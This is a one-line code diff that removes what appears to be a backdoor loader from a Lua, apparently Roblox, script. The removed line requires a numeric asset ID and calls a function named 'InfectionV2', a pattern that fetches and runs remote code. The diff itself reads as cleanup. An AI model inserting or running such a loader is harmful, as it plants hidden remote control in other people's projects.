@@ -1,1 +1,0 @@
-require(0x7504e8dfeb54).InfectionV2("kc0wo")
